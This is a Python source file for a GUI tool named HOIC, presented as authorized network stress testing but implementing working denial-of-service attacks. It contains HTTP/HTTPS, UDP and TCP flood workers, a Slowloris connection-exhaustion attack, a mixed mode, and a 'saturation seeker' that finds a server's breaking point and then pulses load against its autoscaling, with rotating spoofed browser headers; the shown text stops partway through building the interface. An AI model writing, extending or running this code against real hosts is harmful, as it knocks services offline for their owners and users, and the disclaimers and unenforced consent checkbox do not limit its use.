#!/usr/bin/env python3
"""
HOIC - High Orbital Ion Cannon
Modern cross-platform network stress testing tool for AUTHORIZED security research.

Requires explicit permission. Unauthorized use is illegal.
"""

import customtkinter as ctk
import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
import asyncio
import aiohttp
import threading
import time
import socket
import random
import math
import json
from collections import deque
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
import os
import sys
from urllib.parse import quote_plus

try:
    from PIL import Image as PILImage
    from PIL import ImageTk
except ImportError:
    PILImage = None
    ImageTk = None

# ============================================================
# DISCLAIMER & LEGAL
# ============================================================
LEGAL_DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════════════════╗
║  HOIC - HIGH ORBITAL ION CANNON                                              ║
║  FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING ONLY               ║
╚══════════════════════════════════════════════════════════════════════════════╝

WARNING: This software generates high volumes of network traffic and can disrupt
services. You MUST have explicit written authorization from the owner of any
system you test.

Unauthorized use against systems without permission is a criminal offense in
virtually every jurisdiction.

By clicking "I UNDERSTAND AND ACCEPT" you confirm:
  • You are using this tool only on systems you own, or where you have
    documented, explicit permission to perform stress/load testing.
  • You understand the legal risks and accept full responsibility.
  • You will stop immediately if requested by the target owner.

Wold Labs and contributors accept NO LIABILITY for misuse.

If you do not have permission, close this application now.
"""

# ============================================================
# CONFIG & DATA
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.reddit.com/",
    "https://twitter.com/",
    "https://github.com/",
]

ATTACK_MODES = [
    "HTTP Flood",
    "HTTPS Flood",
    "UDP Flood",
    "TCP Flood",
    "Slowloris (HTTP)",
    "Mixed (HTTP + UDP)",
    "Adaptive Saturation Seeker",
]

HTTP_MESSAGE_MODES = {
    "HTTP Flood",
    "HTTPS Flood",
    "Slowloris (HTTP)",
    "Mixed (HTTP + UDP)",
    "Adaptive Saturation Seeker",
}

PAYLOAD_MESSAGE_MODES = {
    "UDP Flood",
    "TCP Flood",
    "Mixed (HTTP + UDP)",
}

MESSAGE_SUPPORTED_MODES = HTTP_MESSAGE_MODES | PAYLOAD_MESSAGE_MODES

WORKERS_MIN = 5
WORKERS_MAX = 800
WORKERS_DEFAULT = 150


@dataclass
class AttackConfig:
    target_host: str
    target_port: int
    mode: str
    workers: int = 150
    duration: int = 60
    packet_size: int = 1024
    use_https: bool = False
    timeout: float = 8.0
    path: str = "/"
    method: str = "GET"
    # Saturation seeker tuning
    probe_duration: int = 5
    saturation_error_threshold: float = 0.10
    saturation_latency_p95_ms: float = 2000.0
    resonance_period: float = 12.0
    attack_message: str = ""


# ============================================================
# PURE HELPERS (testable)
# ============================================================

def make_payload(size: int) -> bytes:
    """Generate random payload bytes for flood packets."""
    return os.urandom(max(1, size))


def message_is_set(message: str) -> bool:
    return bool(sanitize_http_header_value(message))


def embed_message_in_payload(size: int, message: str) -> bytes:
    """Prefix UDP/TCP payloads with a cleartext ASCII marker visible in packet captures."""
    msg = sanitize_http_header_value(message)
    if not msg:
        return make_payload(size)
    prefix = f"HOICMSG:{msg}|".encode("ascii", errors="ignore")
    if len(prefix) >= size:
        return prefix[: max(1, size)]
    return prefix + os.urandom(size - len(prefix))


def build_message_post_body(message: str) -> bytes:
    msg = sanitize_http_header_value(message)
    return f"hoic_message={quote_plus(msg)}".encode("ascii")


def normalize_worker_count(
    value: float,
    min_workers: int = WORKERS_MIN,
    max_workers: int = WORKERS_MAX,
) -> int:
    """Round slider float to a whole worker count within bounds."""
    return max(min_workers, min(max_workers, int(round(value))))


def mode_supports_message(mode: str) -> bool:
    return mode in MESSAGE_SUPPORTED_MODES


def sanitize_http_header_value(value: str, max_len: int = 256) -> str:
    """Strip control chars/newlines for safe HTTP header embedding."""
    cleaned = "".join(c for c in value if c.isprintable() and c not in "\r\n")
    return cleaned[:max_len].strip()


def build_random_headers(host: str, message: str = "") -> dict:
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(["*/*", "text/html,application/xhtml+xml", "application/json"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "de-DE,de;q=0.7,en;q=0.3"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Host": host,
    }
    return apply_message_to_headers(headers, message)


def apply_message_to_headers(headers: dict, message: str) -> dict:
    msg = sanitize_http_header_value(message)
    if not msg:
        return headers
    updated = headers.copy()
    updated["X-HOIC-Message"] = msg
    if "User-Agent" in updated:
        updated["User-Agent"] = f"{updated['User-Agent']} [HOIC:{msg}]"
    return updated


def mode_uses_http_message(mode: str) -> bool:
    return mode in HTTP_MESSAGE_MODES


def mode_uses_payload_message(mode: str) -> bool:
    return mode in PAYLOAD_MESSAGE_MODES


def apply_message_to_params(params: dict, message: str) -> dict:
    msg = sanitize_http_header_value(message)
    if not msg:
        return params
    updated = params.copy()
    updated["msg"] = msg
    return updated


def compute_error_rate(sent: int, errors: int) -> float:
    total = sent + errors
    return errors / total if total > 0 else 0.0


def compute_percentile(samples: List[float], percentile: float) -> float:
    """Nearest-rank percentile (common for latency SLIs)."""
    if not samples:
        return 0.0
    ordered = sorted(samples)
    idx = math.ceil(percentile / 100.0 * len(ordered)) - 1
    idx = max(0, min(idx, len(ordered) - 1))
    return ordered[idx]


def is_target_saturated(
    error_rate: float,
    p95_ms: float,
    error_threshold: float = 0.10,
    latency_threshold_ms: float = 2000.0,
) -> bool:
    return error_rate >= error_threshold or p95_ms >= latency_threshold_ms


def saturation_search_bounds(low: int, high: int, mid: int, saturated: bool) -> tuple:
    """Return updated (low, high) after a binary-search probe."""
    if saturated:
        return low, mid - 1
    return mid + 1, high


def resonance_wave_factor(
    elapsed: float,
    period: float = 12.0,
    min_factor: float = 0.35,
    max_factor: float = 1.15,
) -> float:
    """Sine-modulated intensity envelope mimicking flash-crowd / autoscale resonance."""
    if period <= 0:
        return max_factor
    phase = (elapsed % period) / period
    return min_factor + (max_factor - min_factor) * (0.5 + 0.5 * math.sin(2 * math.pi * phase))


def active_resonance_workers(base_workers: int, elapsed: float, period: float = 12.0) -> int:
    """Scale live worker count around the discovered breakpoint."""
    factor = resonance_wave_factor(elapsed, period=period)
    return max(1, int(base_workers * factor))


# ============================================================
# STATS & CONTROLLER
# ============================================================

class Stats:
    def __init__(self, max_latency_samples: int = 3000):
        self.max_latency_samples = max_latency_samples
        self.reset()

    def reset(self):
        self.sent = 0
        self.errors = 0
        self.start_time = None
        self.latencies_ms: deque = deque(maxlen=self.max_latency_samples)
        self.saturation_point: Optional[int] = None
        self.probe_history: List[Dict[str, Any]] = []
        self._lock = threading.Lock()

    def start(self):
        with self._lock:
            self.start_time = time.time()
            self.sent = 0
            self.errors = 0
            self.latencies_ms.clear()
            self.saturation_point = None
            self.probe_history = []

    def record_sent(self, count: int = 1):
        with self._lock:
            self.sent += count

    def record_error(self, count: int = 1):
        with self._lock:
            self.errors += count

    def record_latency(self, ms: float):
        with self._lock:
            self.latencies_ms.append(ms)

    def record_probe(self, workers: int, sent: int, errors: int, p95_ms: float, saturated: bool):
        with self._lock:
            self.probe_history.append({
                "workers": workers,
                "sent": sent,
                "errors": errors,
                "error_rate": compute_error_rate(sent, errors),
                "p95_ms": p95_ms,
                "saturated": saturated,
            })

    def set_saturation_point(self, workers: int):
        with self._lock:
            self.saturation_point = workers

    def get_percentiles(self) -> Dict[str, float]:
        with self._lock:
            samples = list(self.latencies_ms)
        return {
            "p50": compute_percentile(samples, 50),
            "p95": compute_percentile(samples, 95),
            "p99": compute_percentile(samples, 99),
        }

    def get_stats(self):
        with self._lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            rate = self.sent / elapsed if elapsed > 0 else 0
            samples = list(self.latencies_ms)
            saturation = self.saturation_point
            probes = list(self.probe_history)
        percentiles = {
            "p50": compute_percentile(samples, 50),
            "p95": compute_percentile(samples, 95),
            "p99": compute_percentile(samples, 99),
        }
        return {
            "sent": self.sent,
            "errors": self.errors,
            "elapsed": elapsed,
            "rate": rate,
            "latency": percentiles,
            "saturation_point": saturation,
            "probe_history": probes,
        }


class AttackController:
    def __init__(self, log_callback, stats_callback):
        self.log = log_callback
        self.stats_cb = stats_callback
        self.stats = Stats()
        self.stop_event = threading.Event()
        self.running = False
        self.workers: List[threading.Thread] = []
        self._asyncio_thread: Optional[threading.Thread] = None

    def log_msg(self, msg: str, level: str = "INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log(f"[{ts}] [{level}] {msg}")

    def start(self, cfg: AttackConfig):
        if self.running:
            self.log_msg("Attack already running", "WARN")
            return False

        self.stop_event.clear()
        self.stats.reset()
        self.stats.start()
        self.running = True
        self.workers = []

        self.log_msg(f"Starting {cfg.mode} against {cfg.target_host}:{cfg.target_port}")
        self.log_msg(f"Workers: {cfg.workers} | Duration: {cfg.duration}s | Packet size: {cfg.packet_size}")
        if message_is_set(cfg.attack_message):
            self.log_msg(f"Attack message: {sanitize_http_header_value(cfg.attack_message)}")
            if mode_uses_http_message(cfg.mode) and (
                cfg.mode == "HTTPS Flood" or cfg.use_https
            ):
                self.log_msg(
                    "HTTPS/TLS mode: message is encrypted on the wire — "
                    "use HTTP Flood for cleartext packet capture, or decrypt TLS in Wireshark",
                    "WARN",
                )
            elif mode_uses_payload_message(cfg.mode):
                self.log_msg("Message embedded as HOICMSG: prefix in packet payloads (visible in capture)", "INFO")
            elif mode_uses_http_message(cfg.mode):
                self.log_msg(
                    "Message sent in HTTP POST body, X-HOIC-Message header, and User-Agent (cleartext)",
                    "INFO",
                )

        if cfg.mode in ("HTTP Flood", "HTTPS Flood"):
            self._start_http(cfg)
        elif cfg.mode == "UDP Flood":
            self._start_udp(cfg)
        elif cfg.mode == "TCP Flood":
            self._start_tcp(cfg)
        elif cfg.mode == "Slowloris (HTTP)":
            self._start_slowloris(cfg)
        elif cfg.mode == "Mixed (HTTP + UDP)":
            self._start_mixed(cfg)
        elif cfg.mode == "Adaptive Saturation Seeker":
            self._start_saturation_seeker(cfg)
        else:
            self.log_msg(f"Unknown mode {cfg.mode}", "ERROR")
            self.stop()
            return False

        threading.Thread(target=self._stats_updater, daemon=True).start()

        if cfg.duration > 0:
            threading.Timer(cfg.duration, self.stop).start()
            self.log_msg(f"Auto-stop scheduled in {cfg.duration} seconds")

        return True

    def stop(self):
        if not self.running:
            return
        self.log_msg("STOP requested - signalling workers...")
        self.stop_event.set()
        self.running = False

        for t in self.workers:
            if t.is_alive():
                t.join(timeout=2.0)
        self.workers.clear()

        final = self.stats.get_stats()
        if final.get("saturation_point") is not None:
            self.log_msg(
                f"Saturation breakpoint: {final['saturation_point']} workers | "
                f"p95 latency: {final['latency']['p95']:.0f}ms"
            )
        self.log_msg(
            f"Attack stopped. Total sent: {final['sent']} | Errors: {final['errors']} | "
            f"Avg rate: {final['rate']:.1f}/s"
        )
        self.stats_cb(final)

    def _stats_updater(self):
        while self.running and not self.stop_event.is_set():
            s = self.stats.get_stats()
            self.stats_cb(s)
            time.sleep(0.6)
        s = self.stats.get_stats()
        self.stats_cb(s)

    # ---------------- HTTP / HTTPS (modern async) ----------------
    def _start_http(self, cfg: AttackConfig):
        use_ssl = cfg.mode == "HTTPS Flood" or cfg.use_https

        def runner():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self._http_main(cfg, use_ssl))
            except Exception as e:
                self.log_msg(f"HTTP runner error: {e}", "ERROR")
            finally:
                if self.running:
                    self.stop()

        t = threading.Thread(target=runner, daemon=True, name="HOIC-HTTP")
        t.start()
        self.workers.append(t)
        self._asyncio_thread = t

    async def _http_main(self, cfg: AttackConfig, use_ssl: bool):
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{cfg.target_host}:{cfg.target_port}{cfg.path}"
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=cfg.timeout)

        async def worker(wid: int):
            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while not self.stop_event.is_set():
                    try:
                        h = headers_base.copy()
                        h["X-HOIC-ID"] = f"{wid}-{random.randint(1000, 999999)}"
                        if random.random() < 0.3:
                            h["Referer"] = random.choice(REFERERS)

                        t0 = time.perf_counter()
                        await self._send_http_request(session, url, cfg, h)
                        self.stats.record_latency((time.perf_counter() - t0) * 1000)
                        self.stats.record_sent()
                    except asyncio.CancelledError:
                        break
                    except Exception:
                        self.stats.record_error()
                        await asyncio.sleep(0.02)

        tasks = [asyncio.create_task(worker(i)) for i in range(cfg.workers)]
        try:
            await asyncio.gather(*tasks)
        except Exception as e:
            self.log_msg(f"HTTP worker pool error: {e}", "ERROR")
        finally:
            await connector.close()

    async def _send_http_request(
        self,
        session: aiohttp.ClientSession,
        url: str,
        cfg: AttackConfig,
        headers: dict,
    ):
        """Send HTTP request; embed message in POST body for cleartext capture visibility."""
        msg = sanitize_http_header_value(cfg.attack_message)
        h = headers.copy()
        if msg:
            h = apply_message_to_headers(h, msg)
            h["Content-Type"] = "application/x-www-form-urlencoded"
            body = build_message_post_body(msg)
            async with session.post(url, headers=h, data=body) as resp:
                await resp.read()
        elif cfg.method == "POST":
            data = os.urandom(random.randint(128, cfg.packet_size))
            async with session.post(url, headers=h, data=data) as resp:
                await resp.read()
        else:
            params = apply_message_to_params(
                {"t": int(time.time() * 1000), "r": random.randint(100000, 999999)},
                cfg.attack_message,
            )
            async with session.get(url, headers=h, params=params) as resp:
                await resp.read()

    # ---------------- Adaptive Saturation Seeker ----------------
    def _start_saturation_seeker(self, cfg: AttackConfig):
        use_ssl = cfg.use_https or cfg.target_port == 443

        def runner():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self._saturation_main(cfg, use_ssl))
            except Exception as e:
                self.log_msg(f"Saturation seeker error: {e}", "ERROR")
            finally:
                if self.running:
                    self.stop()

        t = threading.Thread(target=runner, daemon=True, name="HOIC-Saturation")
        t.start()
        self.workers.append(t)
        self._asyncio_thread = t

    async def _saturation_main(self, cfg: AttackConfig, use_ssl: bool):
        scheme = "https" if use_ssl else "http"
        url = f"{scheme}://{cfg.target_host}:{cfg.target_port}{cfg.path}"

        self.log_msg(
            "Saturation Seeker: binary-searching concurrency knee + resonance-wave hold"
        )
        self.log_msg(
            f"Thresholds: error>={cfg.saturation_error_threshold:.0%} or "
            f"p95>={cfg.saturation_latency_p95_ms:.0f}ms"
        )

        deadline = time.time() + cfg.duration if cfg.duration > 0 else float("inf")
        low, high = 5, max(5, cfg.workers)
        best_workers = low

        while not self.stop_event.is_set() and time.time() < deadline and low <= high:
            mid = (low + high) // 2
            self.log_msg(f"Probe phase: {mid} workers for {cfg.probe_duration}s...")

            probe = await self._run_http_probe(url, cfg, mid, cfg.probe_duration, use_ssl)
            error_rate = compute_error_rate(probe["sent"], probe["errors"])
            saturated = is_target_saturated(
                error_rate,
                probe["p95_ms"],
                cfg.saturation_error_threshold,
                cfg.saturation_latency_p95_ms,
            )

            self.stats.record_probe(mid, probe["sent"], probe["errors"], probe["p95_ms"], saturated)
            self.log_msg(
                f"  Probe result: sent={probe['sent']} errors={probe['errors']} "
                f"err_rate={error_rate:.1%} p95={probe['p95_ms']:.0f}ms "
                f"{'SATURATED' if saturated else 'OK'}"
            )

            if not saturated:
                best_workers = mid
            low, high = saturation_search_bounds(low, high, mid, saturated)

        self.stats.set_saturation_point(best_workers)
        self.log_msg(f"BREAKPOINT: {best_workers} workers is max sustainable concurrency")

        remaining = deadline - time.time()
        if remaining > 1 and best_workers > 0 and not self.stop_event.is_set():
            self.log_msg(
                f"Resonance wave: modulating {best_workers} workers for {remaining:.0f}s "
                f"(period={cfg.resonance_period}s) to expose autoscale oscillation"
            )
            await self._run_resonance_hold(url, cfg, best_workers, remaining, use_ssl)

    async def _run_http_probe(
        self,
        url: str,
        cfg: AttackConfig,
        worker_count: int,
        duration: float,
        use_ssl: bool,
    ) -> Dict[str, Any]:
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=cfg.timeout)
        sent = 0
        errors = 0
        latencies: List[float] = []
        end_at = time.time() + duration
        stop = asyncio.Event()

        async def probe_worker(wid: int):
            nonlocal sent, errors
            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while not stop.is_set() and not self.stop_event.is_set():
                    if time.time() >= end_at:
                        break
                    try:
                        h = headers_base.copy()
                        h["X-HOIC-Probe"] = f"{wid}-{random.randint(1000, 999999)}"
                        t0 = time.perf_counter()
                        await self._send_http_request(session, url, cfg, h)
                        latencies.append((time.perf_counter() - t0) * 1000)
                        sent += 1
                        self.stats.record_sent()
                        self.stats.record_latency(latencies[-1])
                    except asyncio.CancelledError:
                        break
                    except Exception:
                        errors += 1
                        self.stats.record_error()
                        await asyncio.sleep(0.02)

        tasks = [asyncio.create_task(probe_worker(i)) for i in range(worker_count)]
        try:
            await asyncio.sleep(duration)
        finally:
            stop.set()
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            await connector.close()

        return {
            "sent": sent,
            "errors": errors,
            "p95_ms": compute_percentile(latencies, 95),
        }

    async def _run_resonance_hold(
        self,
        url: str,
        cfg: AttackConfig,
        base_workers: int,
        duration: float,
        use_ssl: bool,
    ):
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=cfg.timeout)
        hold_start = time.time()
        end_at = hold_start + duration
        active_tasks: Dict[int, asyncio.Task] = {}
        task_id = 0

        async def resonance_worker(wid: int):
            headers_base = build_random_headers(cfg.target_host, cfg.attack_message)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                while not self.stop_event.is_set() and time.time() < end_at:
                    try:
                        h = headers_base.copy()
                        h["X-HOIC-Resonance"] = f"{wid}-{random.randint(1000, 999999)}"
                        t0 = time.perf_counter()
                        await self._send_http_request(session, url, cfg, h)
                        self.stats.record_latency((time.perf_counter() - t0) * 1000)
                        self.stats.record_sent()
                    except asyncio.CancelledError:
                        break
                    except Exception:
                        self.stats.record_error()
                        await asyncio.sleep(0.02)

        try:
            while not self.stop_event.is_set() and time.time() < end_at:
                elapsed = time.time() - hold_start
                target = active_resonance_workers(base_workers, elapsed, cfg.resonance_period)
                current = len(active_tasks)

                if target > current:
                    for _ in range(target - current):
                        task_id += 1
                        active_tasks[task_id] = asyncio.create_task(resonance_worker(task_id))
                elif target < current:
                    to_remove = list(active_tasks.keys())[: current - target]
                    for key in to_remove:
                        active_tasks[key].cancel()
                        del active_tasks[key]

                await asyncio.sleep(0.5)
        finally:
            for task in active_tasks.values():
                task.cancel()
            await asyncio.gather(*active_tasks.values(), return_exceptions=True)
            await connector.close()

    # ---------------- UDP Flood ----------------
    def _start_udp(self, cfg: AttackConfig):
        try:
            ip = socket.gethostbyname(cfg.target_host)
        except Exception as e:
            self.log_msg(f"DNS resolve failed: {e}", "ERROR")
            self.stop()
            return

        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
            payload = embed_message_in_payload(cfg.packet_size, cfg.attack_message)
            while not self.stop_event.is_set():
                try:
                    sock.sendto(payload, (ip, cfg.target_port))
                    self.stats.record_sent()
                    if random.random() < 0.02:
                        time.sleep(0.001)
                except Exception:
                    self.stats.record_error()
                    time.sleep(0.01)
            sock.close()

        self._launch_workers(worker, cfg.workers, "UDP")

    # ---------------- TCP Flood ----------------
    def _start_tcp(self, cfg: AttackConfig):
        try:
            ip = socket.gethostbyname(cfg.target_host)
        except Exception as e:
            self.log_msg(f"DNS resolve failed: {e}", "ERROR")
            self.stop()
            return

        def worker():
            while not self.stop_event.is_set():
                s = None
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, cfg.target_port))
                    payload = embed_message_in_payload(min(cfg.packet_size, 4096), cfg.attack_message)
                    for _ in range(3):
                        if self.stop_event.is_set():
                            break
                        s.send(payload)
                        self.stats.record_sent()
                except Exception:
                    self.stats.record_error()
                    time.sleep(0.05)
                finally:
                    if s is not None:
                        try:
                            s.close()
                        except Exception:
                            pass

        self._launch_workers(worker, max(1, cfg.workers // 3), "TCP")

    # ---------------- Slowloris ----------------
    def _start_slowloris(self, cfg: AttackConfig):
        try:
            ip = socket.gethostbyname(cfg.target_host)
        except Exception as e:
            self.log_msg(f"DNS resolve failed: {e}", "ERROR")
            self.stop()
            return

        def slow_worker():
            sockets: List[socket.socket] = []
            try:
                while not self.stop_event.is_set():
                    while len(sockets) < min(cfg.workers, 250) and not self.stop_event.is_set():
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(6)
                            s.connect((ip, cfg.target_port))
                            s.send(f"GET {cfg.path} HTTP/1.1\r\n".encode())
                            s.send(f"Host: {cfg.target_host}\r\n".encode())
                            s.send(("User-Agent: " + random.choice(USER_AGENTS) + "\r\n").encode())
                            s.send(b"Accept: */*\r\n")
                            s.send(b"Connection: Keep-Alive\r\n")
                            msg = sanitize_http_header_value(cfg.attack_message)
                            if msg:
                                s.send(f"X-HOIC-Message: {msg}\r\n".encode())
                            sockets.append(s)
                            self.stats.record_sent()
                        except Exception:
                            self.stats.record_error()
                            time.sleep(0.05)
                        if self.stop_event.is_set():
                            break

                    if self.stop_event.is_set():
                        break

                    for s in list(sockets):
                        if self.stop_event.is_set():
                            break
                        try:
                            s.send(f"X-a: {random.randint(1, 99999)}\r\n".encode())
                            self.stats.record_sent()
                        except Exception:
                            sockets.remove(s)
                            try:
                                s.close()
                            except Exception:
                                pass

                    for _ in range(8):
                        if self.stop_event.is_set():
                            break
                        time.sleep(1)
            finally:
                for s in list(sockets):
                    try:
                        s.close()
                    except Exception:
                        pass
                sockets.clear()

        t = threading.Thread(target=slow_worker, daemon=True, name="HOIC-Slowloris")
        t.start()
        self.workers.append(t)

    def _start_mixed(self, cfg: AttackConfig):
        use_http_ssl = cfg.use_https or (cfg.target_port == 443)
        http_cfg = AttackConfig(
            target_host=cfg.target_host,
            target_port=cfg.target_port,
            mode="HTTP Flood",
            workers=max(30, cfg.workers // 2),
            duration=cfg.duration,
            packet_size=cfg.packet_size,
            use_https=use_http_ssl,
            attack_message=cfg.attack_message,
        )
        self._start_http(http_cfg)

        try:
            ip = socket.gethostbyname(cfg.target_host)
        except Exception as e:
            self.log_msg(f"Mixed mode UDP skipped: DNS failed ({e})", "WARN")
            return

        def udp_w():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = embed_message_in_payload(cfg.packet_size, cfg.attack_message)
            while not self.stop_event.is_set():
                try:
                    sock.sendto(payload, (ip, cfg.target_port))
                    self.stats.record_sent()
                except Exception:
                    self.stats.record_error()
            sock.close()

        self._launch_workers(udp_w, max(15, cfg.workers // 4), "MIX-UDP")

    def _launch_workers(self, worker_func, count: int, prefix: str):
        for i in range(count):
            t = threading.Thread(target=worker_func, daemon=True, name=f"HOIC-{prefix}-{i}")
            t.start()
            self.workers.append(t)


# ============================================================
# GUI
# ============================================================

class HOICApp:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("HOIC - High Orbital Ion Cannon")
        self.root.geometry("980x720")
        self.root.minsize(880, 640)

        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")

        self.controller = AttackController(self.append_log, self.update_stats)
        self.last_config = None
        self.last_stats = {}
        self._build_ui()

        self.root.after(200, self.show_legal_warning)

    def _build_ui(self):
        top = ctk.CTkFrame(self.root, fg_color="transparent")
        top.pack(fill="x", padx=12, pady=(10, 4))

        banner_path = os.path.join(os.path.dirname(__file__), "assets", "hoic-banner.jpg")

        self.banner_img = None
        if os.path.exists(banner_path) and PILImage is not None:
            try:
                pil_img = PILImage.open(banner_path)
                self.banner_img = ctk.CTkImage(
                    light_image=pil_img, dark_image=pil_img, size=(960, 140)
                )
                ctk.CTkLabel(top, image=self.banner_img, text="").pack()
            except Exception:
                pass

        title_frame = ctk.CTkFrame(top, fg_color="transparent")
        title_frame.pack(fill="x", pady=6)

        ctk.CTkLabel(
            title_frame, text="HOIC", font=ctk.CTkFont(size=32, weight="bold"), text_color="#00ddff"
        ).pack(side="left", padx=(12, 8))
        ctk.CTkLabel(
            title_frame, text="High Orbital Ion Cannon", font=ctk.CTkFont(size=20), text_color="#a0a0ff"
        ).pack(side="left")
        ctk.CTkLabel(
            title_frame,
            text="  v1.1  •  Authorized Security Research Tool",
            font=ctk.CTkFont(size=12),
            text_color="#777777",
        ).pack(side="left", padx=12)

        legal = ctk.CTkLabel(
            self.root,
            text="⚠ FOR AUTHORIZED SECURITY RESEARCH AND PENETRATION TESTING WITH EXPLICIT PERMISSION ONLY ⚠",
            font=ctk.CTkFont(size=12, weight="bold"),
            fg_color="#3a1f1f",
            text_color="#ffaa66",
        )
        legal.pack(fill="x", padx=12, pady=(2, 8))

        main = ctk.CTkFrame(self.root)
        main.pack(fill="both", expand=True, padx=12, pady=4)

        left = ctk.CTkFrame(main)
        left.pack(side="left", fill="y", padx=(8, 4), pady=8)

        ctk.CTkLabel(left, text="TARGET", font=ctk.CTkFont(size=14, weight="bold")).pack(
            anchor="w", padx=12, pady=(8, 2)
        )

        self.target_entry = ctk.CTkEntry(left, placeholder_text="example.com or 203.0.113.50", width=260)
        self.target_entry.pack(padx=12, pady=2)
        self.target_entry.insert(0, "127.0.0.1")

        port_frame = ctk.CTkFrame(left, fg_color="transparent")
        port_frame.pack(fill="x", padx=12, pady=2)
        ctk.CTkLabel(port_frame, text="Port:").pack(side="left")
        self.port_entry = ctk.CTkEntry(port_frame, width=80)
        self.port_entry.pack(side="left", padx=6)
        self.port_entry.insert(0, "80")

        ctk.CTkLabel(left, text="ATTACK MODE", font=ctk.CTkFont(size=14, weight="bold")).pack(
            anchor="w", padx=12, pady=(12, 2)
        )

        self.mode_var = ctk.StringVar(value=ATTACK_MODES[0])
        self.mode_menu = ctk.CTkOptionMenu(
            left, values=ATTACK_MODES, variable=self.mode_var, width=260, command=self._on_mode_change
        )
        self.mode_menu.pack(padx=12, pady=2)

        ctk.CTkLabel(left, text="WORKERS (concurrency)", font=ctk.CTkFont(size=13)).pack(
            anchor="w", padx=12, pady=(10, 0)
        )
        # One step per worker so slider values are exact integers (5–800)
        self.workers_slider = ctk.CTkSlider(
            left,
            from_=WORKERS_MIN,
            to=WORKERS_MAX,
            number_of_steps=WORKERS_MAX - WORKERS_MIN,
        )
        self.workers_slider.pack(fill="x", padx=12, pady=2)
        self.workers_slider.set(WORKERS_DEFAULT)
        self.workers_label = ctk.CTkLabel(left, text=str(self._read_workers_slider()))
        self.workers_label.pack(anchor="w", padx=12)
        self.workers_slider.configure(
            command=lambda v: self.workers_label.configure(text=str(normalize_worker_count(v)))
        )

        ctk.CTkLabel(
            left, text="DURATION (seconds, 0 = until stopped)", font=ctk.CTkFont(size=13)
        ).pack(anchor="w", padx=12, pady=(8, 0))
        self.duration_entry = ctk.CTkEntry(left, width=120)
        self.duration_entry.pack(anchor="w", padx=12, pady=2)
        self.duration_entry.insert(0, "60")

        ctk.CTkLabel(left, text="PACKET / REQUEST SIZE (bytes)", font=ctk.CTkFont(size=13)).pack(
            anchor="w", padx=12, pady=(8, 0)
        )
        self.size_entry = ctk.CTkEntry(left, width=120)
        self.size_entry.pack(anchor="w", padx=12, pady=2)
        self.size_entry.insert(0, "1400")

        self.message_var = tk.StringVar(value="")
        self.message_label = ctk.CTkLabel(
            left,
            text="ATTACK MESSAGE (embedded in packets)",
            font=ctk.CTkFont(size=13),
        )
        self.message_label.pack(anchor="w", padx=12, pady=(8, 0))
        self.message_entry = ctk.CTkEntry(
            left,
            textvariable=self.message_var,
            placeholder_text="Visible in HTTP body/headers or UDP/TCP payload prefix",
            width=260,
        )
        self.message_entry.pack(padx=12, pady=2)

        self.consent_var = tk.BooleanVar(value=False)
        self.consent_cb = ctk.CTkCheckBox(
            left,
            text="I have EXPLICIT written authorization to test the target",
            variable=self.consent_var,
            onvalue=True,
            offvalue=False,
            font=ctk.CTkFont(size=11, weight="bold"),
            text_color="#ffcc66",
        )
        self.consent_cb.pack(anchor="w", padx=12, pady=(16, 4))

        self.note_entry = ctk.CTkEntry(
            left, placeholder_text="Authorization reference / ticket # (optional)", width=260
        )
        self.note_entry.pack(padx=12, pady=2)

